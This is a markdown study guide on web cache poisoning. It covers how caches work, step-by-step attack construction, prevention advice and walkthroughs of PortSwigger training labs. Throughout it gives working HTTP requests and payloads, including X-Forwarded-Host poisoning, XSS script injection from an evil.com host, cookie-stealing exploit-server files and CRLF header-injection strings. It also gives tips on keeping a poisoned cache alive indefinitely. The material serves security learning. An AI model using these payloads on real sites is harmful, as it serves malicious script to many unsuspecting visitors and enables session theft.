# üõ° Web Cache Poisoning

## üìë Table of Contents
1. [What is Web Cache Poisoning?](#1Ô∏è‚É£-what-is-web-cache-poisoning)
2. [How Does a Web Cache Work?](#2Ô∏è‚É£-how-does-a-web-cache-work)
3. [Impact of a Web Cache Poisoning Attack](#3Ô∏è‚É£-impact-of-a-web-cache-poisoning-attack)
4. [Constructing a Web Cache Poisoning Attack](#4Ô∏è‚É£-constructing-a-web-cache-poisoning-attack)
5. [Exploiting Web Cache Poisoning Vulnerabilities](#5Ô∏è‚É£-exploiting-web-cache-poisoning-vulnerabilities)
6. [Prevention Techniques](#6Ô∏è‚É£-how-to-prevent-web-cache-poisoning-vulnerabilities)
7. [Lab's](#-lbas)

---

## 1Ô∏è‚É£ What is Web Cache Poisoning?
Cache: Small, ***temporary storage*** that keeps frequently accessed data for quick access.

*Web-cache*  : Stores parts of a website (pages, images, scripts) so they can be served faster without always going back to the main server.

**Web cache poisoning** is an attack where an attacker manipulates a web server‚Äôs cache to store a **malicious HTTP response**.  
When other users request the same resource, they receive the **poisoned (malicious) response** instead of the intended one.

The attacker‚Äôs goal: **Serve malicious content to many users** via the cache without directly targeting each one.

---

## 2Ô∏è‚É£ How Does a Web Cache Work?
A **web cache** stores HTTP responses so that future requests for the same resource can be served quickly without re-fetching from the origin server.  
Types of caches:
- **Browser Cache** ‚Äì Stored on the client side.
- **CDN / Reverse Proxy Cache** ‚Äì Stored at network level (e.g., Cloudflare, Akamai).
- **Server Cache** ‚Äì Stored on the web server.

**Basic process:**
1. Client sends HTTP request.
2. Cache checks if a valid cached copy exists.
3. If yes ‚Üí serve cached response.  
   If no ‚Üí forward request to server ‚Üí store server‚Äôs response in cache ‚Üí serve to client.

üÖ∞Ô∏è **Keyed Cache** ::  A keyed cache is when the cache takes certain request parameters (query strings, headers, cookies, etc.) into account when deciding if a response is the same as a previously cached one.

``` Example 
GET /1.5 HTTP/2
Host: mozilla.com
```

üÖ±Ô∏è **Unkeyed Cache** :: An unkeyed cache is when the cache ignores certain request parameters, so multiple different requests can map to the same cached object.

``` Example 
User-Agent: Firefox/128.-desktop
Accept: application/json;q=0.9,*/*;q=0.2
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Hawk 
```
---
‚úÖ Check HTTP Response Headers

- curl -w "%{time_total}\n" -o /dev/null -s https://example.com
- curl -I https://example.com

- Most CDNs add cache status headers that indicate whether the content was served from cache or fetched from the origin server.

Common ones:

| CDN / Proxy  | Header Example                   | Meaning |
|--------------|----------------------------------|---------|
| **Cloudflare** | `CF-Cache-Status: HIT`           | Served from CDN cache |
| **CloudFront** | `X-Cache: Hit from cloudfront`   | Served from CDN cache |
| **Fastly**     | `X-Cache: HIT`                   | Served from cache |
| **Akamai**     | `X-Cache: TCP_HIT`               | Served from cache |
| **Varnish**    | `Age: 123`                       | Seconds since cached copy was fetched |
| **General**    | `Age` header                     | >0 means cached; 0 or missing likely means fresh from server |

```Example
CF-Cache-Status: HIT
MAX-AGE: 600
Age: 253
```

- This means the response was from a CDN‚Äôs cache and was cached 253 seconds ago.
- Look at Response Headers for CDN-specific headers (CF-, X-Cache, Age, etc.).
---

## 3Ô∏è‚É£ Impact of a Web Cache Poisoning Attack
- **Widespread XSS** ‚Äì Inject JavaScript into cached responses.
- **Defacement** ‚Äì Alter content displayed to all users.
- **Phishing** ‚Äì Redirect cached pages to malicious sites.
- **Credential Theft** ‚Äì Inject scripts to steal cookies/session tokens.
- **Service Disruption** ‚Äì Deliver broken or malicious responses to legitimate users.

---

## 4Ô∏è‚É£ Constructing a Web Cache Poisoning Attack

### Step 1: Identify and Evaluate Unkeyed Inputs
- **Unkeyed inputs** are parts of the HTTP request that affect the response **but are not part of the cache key**.
- Example: HTTP headers like `X-Forwarded-Host` or query parameters ignored by the cache.
- **Why it matters:** If the cache ignores an input but the server processes it, you can control the cached output.


### Step 2: Param Miner
- Use **Burp Suite‚Äôs Param Miner extension** to automatically guess:
  - Hidden parameters
  - Non-standard HTTP headers
  - Inputs that may influence server behavior but not the cache key.
- This helps find cache poisoning vectors.

### Step 3: Elicit a Harmful Response from the Back-End Server
- Manipulate the unkeyed input to:
  - Trigger **JavaScript injection** (for XSS)
  - Add **malicious redirects**
  - Alter HTML responses
- Example:
  ```http
  GET / HTTP/1.1
  Host: victim.com
  X-Forwarded-Host: attacker.com
  ```
- Possible payloads:
	- Inject HTML/JS (<script>alert(1)</script>)
	- Change redirect URLs
	- Alter API responses

### Step 4: Get the Response Cached
- Ensure the poisoned response is cacheable:
	- Cache-Control should allow caching (no no-store or private).
	- Sometimes removing cookies (Set-Cookie) makes it cacheable.
- Verify:
	- Send multiple requests ‚Üí see if same response is served without origin server hit.
- Tip: Use Burp‚Äôs Repeater to replay and check if response changes between requests.


### Step 5: Deliver the Poisoned Cache to Victims
- Once the malicious response is cached:
	- Anyone requesting the same URL will get the poisoned content.
	- Works on CDN edges globally if CDN caching is enabled.
- Example:
	- Inject <script src="https://evil.com/x.js"></script> into homepage.
	- Cached at CDN ‚Üí All visitors worldwide load attacker‚Äôs script.

### Step 6: Monitor Cache Behavior
Determine:
- Cache expiry time (`max-age`, `Expires` header).
- Whether partial requests (query params) map to the same cache entry.
- If multiple caches are in the chain (browser ‚Üí CDN ‚Üí reverse proxy).

**Goal:** Maximize reach by understanding cache hierarchy.

### Step 7: Maintain or Refresh the Poison
Some caches may expire quickly.

To persist the attack:
- Periodically resend the poisoning request before expiry.
- Automate refresh with a script or scheduler.

**Note:** This can keep the attack live indefinitely until detected.

## 5Ô∏è‚É£ Exploiting Web Cache Poisoning Vulnerabilities
Once cached, the poisoned content:
- Affects all users who request that cached resource.
- Can persist until cache expiry or manual purge.

**Example scenario:**
1. Attacker injects: into homepage
   ```html
   <script src="https://evil.com/x.js"></script>
   ```
2. Cache stores this malicious page.
3. All visitors load attacker‚Äôs script.

### 6Ô∏è‚É£ How to Prevent Web Cache Poisoning Vulnerabilities

1. Normalize Requests
	- Ensure cache and server process requests identically.
	- Include all user-controllable inputs in cache key.
	- Avoid unkeyed input issues.

2. Sanitize User Input
	- Never reflect unsanitized data in cached responses.

3. Set Strict Caching Rules
	- Use Cache-Control: no-store for dynamic/user-specific content.

4. Whitelist Headers and Parameters
	- Reject or ignore unexpected ones.

5. Security Testing
	- Test with tools like Burp Suite and Param Miner.
	- simulate poisoning scenarios in staging environments.
---

# üî¨ LBA's


- Exploiting cache design flaws
- Exploiting cache implementation flaws



# Exploiting-design-flaws <a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws">‚ÜóÔ∏è</a>

### Lab: Web cache poisoning with an unkeyed header

Approch : 
- Find the GET request for the home page
- Add a cache-buster query parameter, such as ?abc=1234 --> Testing 
- find unkeyed header : using param miner

exploit :
- X-Forwarded-Host : hacker.com



### Lab: Web cache poisoning with an unkeyed cookie
- Place a suitable XSS payload in the fehost cookie, for :
fehost="-alert(1)-"


### Lab: Web cache poisoning with multiple headers

- Find the GET request for the JavaScript file /resources/js/tracking.js
- X-Forwarded-Scheme: HTTPS, you receive a 302 response with loaction.
- Add the X-Forwarded-Scheme: http  &&  X-Forwarded-Host: example.com and  
	-  redirect now points to https://example.com/. 

### Lab: Targeted web cache poisoning using an unknown header

####  ***(Vary: User-Agent)*** : It's mean user agaent is a part of keycache

- In this lab we need to posion User-agent 

- First need to find unkeyed caches using param-miner
- Notice that the Vary header is used to specify that the User-Agent is part of the cache key. need to find out their User-Agent.
- Post a comment containing a suitable payload to cause the victim's browser to interact with your exploit server, for example:
```example
<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
```
- check the logs of exploit server :
- got the victim  ::: "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
- Posion that user-agent



### Lab: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria

- Intercept the home page request in Burp, send to Repeater.
- Use Param Miner to find X-Forwarded-Host is supported.
-	Add a cache buster + X-Forwarded-Host: example.com ‚Üí see it overwrite data.host in initGeoLocate() (DOM-XSS vulnerable).
-	On exploit server, host /resources/json/geolocate.json with:
``` Payload
{"country":"<img src=1 onerror=alert(document.cookie) />"}
```
-	Add header: Access-Control-Allow-Origin: *.
-	In Burp, set X-Forwarded-Host to your exploit server domain.
-	Send until X-Cache: hit (avoid Set-Cookie responses by using a request after session cookie is set).
-	Visit the poisoned page in a browser ‚Üí alert pops.


### Lab: Combining web cache poisoning vulnerabilities
- ***Identify the injection points***
	- In Burp Proxy > HTTP history, load the homepage /.
	-	Use Param Miner ‚Üí find X-Forwarded-Host and X-Original-URL are supported.
- Confirm the translation injection
- Send the request for:
```
GET /?localized=1 https
X-Forwarded-Host: YOUR-ID.exploit-server.net
Cookie: lang=es
```
- Send ‚Üí check that the response loads your JSON from exploit server.
- Load it in browser ‚Üí alert() fires ‚Üí confirmed.

- ***Force language switch for victims***
	- Victims default to English, so force them to Spanish.
	- Request the homepage / with:
```
GET / https
X-Original-URL: /setlang/es//
```


- Combine both poisons
- Keep both caches poisoned:
	- /?localized=1 ‚Üí cached malicious translation (X-Forwarded-Host).
	- / ‚Üí cached redirect to Spanish (X-Original-URL).
- Replay both requests every so often to prevent cache expiry.


<br>

# Exploiting cache implementation flaws <a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws">‚ÜóÔ∏è</a>

### Lab: Web cache poisoning via an unkeyed query string

1Ô∏è‚É£ Identify a cacheable endpoint

- Pick a page likely to be cached ‚Äî usually static pages like /, /home, /products.
- Look for cache headers in the HTTP response:
```
CF-Cache-Status: HIT
X-Cache: HIT
Age: <number>
Cache-Control: public, max-age=...
```


2Ô∏è‚É£ Send two requests to compare

```Example:
GET / HTTP/1.1
Host: example.com
```
***and***
```
GET /?test=123 HTTP/1.1
Host: example.com
```

### Use a cache buster (Prevent production issue)
- Add an Origin header to force a cache miss so your next request is fresh:
```
Origin: https://abc123.com
```
### Check if the parameter is reflected
- In the query parameter value, put something unique:
```
GET /?abc=POISONTEST HTTP/1.1
Host: <lab-domain>
Origin: https://abc123.com
```

3Ô∏è‚É£ Check the response

- If both responses:
	- Return the same body (identical HTML, etc.)
	- And the cache header still says HIT for the second request
    - ‚Üí the query parameter might be ignored in the cache key.

4Ô∏è‚É£ Confirm with a poison test

- Add a unique marker in the query string value:
```
GET /?'/><script>alert(1)</script> HTTP/2
```
- See if that marker appears in the response (e.g., in reflected HTML, redirect, etc.).
- Reload / (without the parameter) ‚Äî
  ***If you still see alert(1) ‚Üí the parameter was unkeyed and cached.*** 

5Ô∏è‚É£ Automate discovery with Param Miner (Burp Suite)
-	In Burp ‚Üí Extensions ‚Üí Install Param Miner.
-	Right-click a request ‚Üí Guess params.
-	Param Miner will fuzz for:
-	Hidden parameters that affect the response
-	Parameters that are unkeyed (affect the response but not the cache key).
```pgsql
# 1. Check normal request
GET / HTTP/1.1
‚Üí 200 OK, CF-Cache-Status: HIT

# 2. Add harmless param
GET /?abc=1 HTTP/1.1
‚Üí 200 OK, CF-Cache-Status: HIT

# 3. Poison attempt
GET /?abc=<script>alert(1)</script>
‚Üí Reflected? Cache HIT? If yes ‚Üí VULNERABLE

```

### Lab: Web cache poisoning via an unkeyed query parameter

##### UTM Parameter : (Urchin Tracking Module parameters) are commonly used for analytics and marketing tracking. The ‚Äústandard‚Äù set used by Google Analytics and many other tools
|Parameter	|Purpose|
|--------------|--------------|
|utm_source	|Identifies the referrer (e.g., newsletter, search engine, partner site)|
|utm_medium	|Describes the marketing medium (e.g., email, CPC, banner)|
|utm_campaign	|Tracks a specific marketing campaign name or slogan|
|utm_term	|Identifies paid search keywords|
|utm_content	|Distinguishes between different ads, links, or CTAs|

##### Other non-standard or extended parameters sometimes used by other platforms:

-	utm_id ‚Äî Campaign ID
-	utm_reader ‚Äî For RSS or newsletter readers
-	utm_name ‚Äî Alternative campaign name
-	utm_creative ‚Äî Creative asset identifier
-	utm_social ‚Äî Social platform name
-	utm_social-type ‚Äî Type of social media (post, ad, etc.)

Solution :
- Observe that the home page is a suitable cache oracle. N
- Add a cache-buster query parameter.
- Use Param Miner's "Guess GET parameters" ::: utm_content
- Observe that this unkeyed parameter is also reflected in the response along with the rest of the query string.
- Send a request with a utm_content parameter that breaks out of the reflected string and injects an XSS payload:
```https
    GET /?utm_content='/><script>alert(1)</script>
```

### Lab: Parameter cloaking

- utm_content is excluded from the cache key.
- Using utm_content=foo;callback=‚Ä¶ lets you smuggle extra params (semicolon trick).
- Target /js/geolocate.js?callback=setCountryCookie.
- Normal callback param is keyed, but smuggling it via utm_content bypasses.
- Payload:
	```bash 
	/js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
	```
- This poisons the cache, so when victims load the script, it executes alert(1).
- Keep replaying to maintain the poisoned cache until lab solves.

### Lab: Web cache poisoning via a fat GET request

- Every page loads /js/geolocate.js?callback=setCountryCookie.
- The server lets you override callback by sending a duplicate in the request body (fat GET).
- The cache key is based only on the query string, not the body.
- Send this request in Repeater:

```bash
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

callback=alert(1)
```
- This poisons the cache ‚Üí victims load the script and run alert(1).


### Lab: URL normalization
- In Burp Repeater, request a non-existent path, e.g.
```
GET /random HTTP/1.1
```
‚Üí The path /random appears in the error response (reflected).
- Inject XSS into the path:
```
GET /random</p><script>alert(1)</script><p>foo HTTP/1.1
```
‚Üí Reflected in the error response.
- In the browser, this doesn‚Äôt execute because browsers URL-encode it (e.g. %3Cscript%3E).
- But the cache key normalization means the cache decodes it ‚Üí your malicious response gets served.
Exploit:
- Use Repeater to poison the cache with the malicious payload above.
- Immediately open the same URL in your browser ‚Äî now the cached response runs alert(1).
```bash 
- Finally, re-poison and submit the same payload URL 
    /random</p><script>alert(1)</script><p>foo)
```
### Lab: Cache key injection

###### üîé Vulnerabilities in play

1.	/login ignores utm_content in cache key ‚Üí **lets us append extra params.**
2.	/js/localize.js ‚Üí **CSPP (Client-Side Parameter Pollution) via lang.**
3.	/js/localize.js ‚Üí **vulnerable to header injection via Origin if cors=1.**
4.	Pragma: x-get-cache-key ‚Üí **confirms cache key injection possible. if output $$,//,&&**

This lab chains **four behaviors** into a cache poisoning exploit:

1. **Unkeyed parameter**  
   `/login` ignores `utm_content` in the cache key ‚Üí allows extra parameters to be smuggled.
2. **Client-Side Parameter Pollution (CSPP)**  
   `/js/localize.js` uses `lang` without URL-encoding ‚Üí vulnerable to client-side injection.
3. **Response Header Injection**  
   `/js/localize.js` is vulnerable to header injection via the `Origin` header if `cors=1`.
4. **Cache Key Injection**  
   `Pragma: x-get-cache-key` confirms that custom values can influence the cache key.

---

##### üí• Exploit Steps

##### Step 1: Poison `/js/localize.js`
Send this request in **Burp Repeater**:
```http
GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
```
- Injects a fake header (Content-Length) ‚Üí body becomes alert(1).
- Cached under a normalized cache key.

#####  Step 2: Poison /login

Send this request:
```
GET /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
```
- Forces /login to reference the poisoned /js/localize.js.

<hr>

### Lab: Internal cache poisoning


1. **Identify cache oracle**
   - Send `GET /` to the homepage.  
   - Add query params (e.g., `?foo=123`).  
   - External cache reacts ‚Üí confirms query strings are keyed.

2. **Probe with X-Forwarded-Host**
   ```http
   X-Forwarded-Host: YOUR-EXPLOIT-SERVER.exploit-server.net
   ```
	 - Sometimes all 3 URLs change.
	 - Other times only canonical + analytics, but geolocate.js stays same.
	 - Shows fragments cached separately.

3. **Spot internal cache behavior**
   - Even with cache-buster (?cb=123), geolocate.js remains cached.
   - Removing the header ‚Üí poisoned fragment persists.
   - ‚úÖ Confirms header is unkeyed by internal cache.

4. **Exploit**

   - On exploit server, create file:
		```
		/js/geolocate.js
		```
	 - With payload:
	 ``` alert(document.cookie)


Re-add malicious X-Forwarded-Host.

Replay request until all 3 URLs (canonical, analytics, geolocate) point to your exploit server.